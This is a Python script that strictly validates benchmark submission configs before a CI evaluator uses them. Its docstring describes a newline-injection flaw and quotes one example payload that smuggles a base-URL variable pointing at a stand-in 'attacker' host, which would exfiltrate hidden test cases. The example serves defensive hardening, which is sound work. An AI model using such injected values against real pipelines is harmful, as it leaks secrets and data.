"""Strictly validate a submission's ``config.yaml`` before the evaluator uses it.

Why this exists as a real script rather than inline workflow YAML
----------------------------------------------------------------

``evaluate-submission.yml`` used to read the config with an inline Python
one-liner, interpolate five submitter-controlled values into a file with
f-strings, and then ``cat`` that file into ``$GITHUB_ENV``. Nothing validated
any of the values, and ``validate_submissions.py`` only grepped for leftover
``FILL_ME`` placeholders.

A newline inside any of those values therefore injected arbitrary environment
variables into a job that holds the hidden-ranked-set token and provider API
keys. The consequence is worse than it first looks, and it does **not** require
the submitter's Python to run at all:

    runtime:
      provider: ollama
      model: "llama3.2\\nCOMPACTBENCH_OLLAMA_BASE_URL=http://attacker/\\nX=y"

``OllamaProvider`` passes ``COMPACTBENCH_OLLAMA_BASE_URL`` straight to its
client, so the runner would send **every hidden ranked case to an
attacker-controlled host as a prompt**. Sandboxing ``method.py`` does not close
that path; validating the config does.

So: every value is checked against a strict allow-list or pattern here, in code
that has unit tests, and the workflow consumes only the normalised JSON this
emits. Values never transit ``$GITHUB_ENV``.

Usage::

    python scripts/validate_submission_config.py submissions/<handle>/<method>/config.yaml

Writes normalised JSON to stdout on success. On failure, writes a GitHub
``::error::`` annotation to stderr and exits non-zero.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from typing import Any

# Provider keys the evaluator will accept. Deliberately a literal list rather
# than `list_providers()`: the ranked runner should only ever target providers
# the maintainer has credentials for and has decided to spend budget on, and
# that decision should not silently widen when a new provider is registered.
ALLOWED_PROVIDERS = frozenset({"groq", "google-ai-studio", "anthropic", "openai"})

ALLOWED_TIERS = frozenset({"Elite-Light", "Elite-Mid", "Elite-Aggressive"})

# Model keys are provider-defined and vary widely, so this is a shape check, not
# an allow-list: alphanumerics plus the separators real model ids use. Crucially
# it excludes whitespace, which is what makes newline injection impossible.
MODEL_PATTERN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._:/-]{0,127}$")

# handle/method-name path component, and the class name after the colon.
CLASS_PATH_PATTERN = re.compile(
    r"^submissions/[A-Za-z0-9][A-Za-z0-9_.-]{0,63}/[A-Za-z0-9][A-Za-z0-9_.-]{0,63}"
    r"/method\.py:[A-Za-z_][A-Za-z0-9_]{0,63}$"
)

HANDLE_PATTERN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9-]{0,38}$")
ORG_PATTERN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9 ._-]{0,63}$")
METHOD_NAME_PATTERN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9 ._-]{0,63}$")
VERSION_PATTERN = re.compile(r"^[0-9]+\.[0-9]+\.[0-9]+$")

# Bounds on the run profile. The ranked protocol is the maintainer's to set, but
# a config outside these bounds is malformed rather than merely unusual.
MIN_DRIFT_CYCLES, MAX_DRIFT_CYCLES = 1, 5
MIN_CASE_COUNT, MAX_CASE_COUNT = 1, 100


class ConfigError(Exception):
    """A submission config that must not be handed to the evaluator."""


def _require_mapping(value: Any, where: str) -> dict[str, Any]:
    if not isinstance(value, dict):
        raise ConfigError(f"{where} must be a mapping, got {type(value).__name__}")
    return {str(k): v for k, v in value.items()}  # pyright: ignore[reportUnknownVariableType]


def _require_clean_str(value: Any, where: str) -> str:
    """Return ``value`` as a string, rejecting anything with control characters.

    The control-character check is the load-bearing one. Everything downstream
    assumes a single-line token; a newline here is what turned a config field
    into arbitrary environment variables in the evaluation job.
    """
    if not isinstance(value, str):
        raise ConfigError(f"{where} must be a string, got {type(value).__name__}")
    if any(ch in value for ch in "\n\r\x00") or any(ord(ch) < 0x20 for ch in value):
        raise ConfigError(
            f"{where} contains a control character or line break. "
            f"This is rejected because such values have been used to inject "
            f"environment variables into the evaluation job."
        )
    return value.strip()


def _match(pattern: re.Pattern[str], value: str, where: str, hint: str) -> str:
    if not pattern.match(value):
        raise ConfigError(f"{where} is not valid ({hint}): {value!r}")
    return value


def _bounded_int(value: Any, where: str, low: int, high: int) -> int:
    if isinstance(value, bool) or not isinstance(value, int):
        raise ConfigError(f"{where} must be an integer, got {type(value).__name__}")
    if not low <= value <= high:
        raise ConfigError(f"{where} must be between {low} and {high}, got {value}")
    return value


def validate_config(raw: Any, *, expected_dir: str | None = None) -> dict[str, Any]:
    """Validate a parsed ``config.yaml`` and return normalised, safe values.

    ``expected_dir`` is the ``submissions/<handle>/<method>`` directory the PR
    actually touched. When given, ``class_path`` must point inside it — without
    that check a submission could name any path in the repo and have the
    evaluator import it.
    """
    top = _require_mapping(raw, "config.yaml")

    method = _require_mapping(top.get("method"), "method")
    runtime = _require_mapping(top.get("runtime"), "runtime")
    attribution = _require_mapping(top.get("attribution", {}), "attribution")

    name = _match(
        METHOD_NAME_PATTERN,
        _require_clean_str(method.get("name"), "method.name"),
        "method.name",
        "letters, digits, spaces, dot, underscore or hyphen; max 64 chars",
    )
    version = _match(
        VERSION_PATTERN,
        _require_clean_str(method.get("version"), "method.version"),
        "method.version",
        "semver, e.g. 1.0.0",
    )
    class_path = _match(
        CLASS_PATH_PATTERN,
        _require_clean_str(method.get("class_path"), "method.class_path"),
        "method.class_path",
        "submissions/<handle>/<method>/method.py:ClassName",
    )
    if expected_dir is not None:
        expected_prefix = f"{expected_dir.rstrip('/')}/method.py:"
        if not class_path.startswith(expected_prefix):
            raise ConfigError(
                f"method.class_path {class_path!r} points outside the submission "
                f"directory this PR touches ({expected_dir!r}). A submission may only "
                f"load code from its own directory."
            )

    provider = _require_clean_str(runtime.get("provider"), "runtime.provider")
    if provider not in ALLOWED_PROVIDERS:
        raise ConfigError(
            f"runtime.provider {provider!r} is not an accepted evaluation provider. "
            f"Allowed: {sorted(ALLOWED_PROVIDERS)}"
        )

    model = _match(
        MODEL_PATTERN,
        _require_clean_str(runtime.get("model"), "runtime.model"),
        "runtime.model",
        "alphanumerics with . _ : / - and no whitespace; max 128 chars",
    )

    tier = _require_clean_str(runtime.get("compression_tier"), "runtime.compression_tier")
    if tier not in ALLOWED_TIERS:
        raise ConfigError(
            f"runtime.compression_tier {tier!r} is not valid. Allowed: {sorted(ALLOWED_TIERS)}"
        )

    drift_cycles = _bounded_int(
        runtime.get("drift_cycles", 2), "runtime.drift_cycles", MIN_DRIFT_CYCLES, MAX_DRIFT_CYCLES
    )
    case_count = _bounded_int(
        runtime.get("case_count_per_template", 20),
        "runtime.case_count_per_template",
        MIN_CASE_COUNT,
        MAX_CASE_COUNT,
    )

    handle = _match(
        HANDLE_PATTERN,
        _require_clean_str(attribution.get("handle"), "attribution.handle"),
        "attribution.handle",
        "a GitHub handle: letters, digits and hyphens; max 39 chars",
    )

    org_raw = attribution.get("org")
    org: str | None = None
    if org_raw is not None:
        org = _match(
            ORG_PATTERN,
            _require_clean_str(org_raw, "attribution.org"),
            "attribution.org",
            "letters, digits, spaces, dot, underscore or hyphen; max 64 chars",
        )

    return {
        "method_name": name,
        "method_version": version,
        "class_path": class_path,
        "provider": provider,
        "model": model,
        "compression_tier": tier,
        "drift_cycles": drift_cycles,
        "case_count_per_template": case_count,
        "handle": handle,
        "org": org,
    }


def main(argv: list[str]) -> int:
    if not 2 <= len(argv) <= 3:
        print(
            "usage: validate_submission_config.py <config.yaml> [expected_submission_dir]",
            file=sys.stderr,
        )
        return 2

    path = Path(argv[1])
    expected_dir = argv[2] if len(argv) == 3 else None

    if not path.is_file():
        print(f"::error::{path} not found", file=sys.stderr)
        return 1

    try:
        # ruamel.yaml, matching the DSL parser — and, unlike pyyaml, a declared
        # dependency of this project. A security-critical validator must not
        # rest on a package that happens to be present transitively.
        from ruamel.yaml import YAML

        raw = YAML(typ="safe").load(path.read_text(encoding="utf-8"))
    except Exception as exc:
        print(f"::error::{path} is not parsable YAML: {exc}", file=sys.stderr)
        return 1

    try:
        normalised = validate_config(raw, expected_dir=expected_dir)
    except ConfigError as exc:
        print(f"::error::{path}: {exc}", file=sys.stderr)
        return 1

    json.dump(normalised, sys.stdout, indent=2, sort_keys=True)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
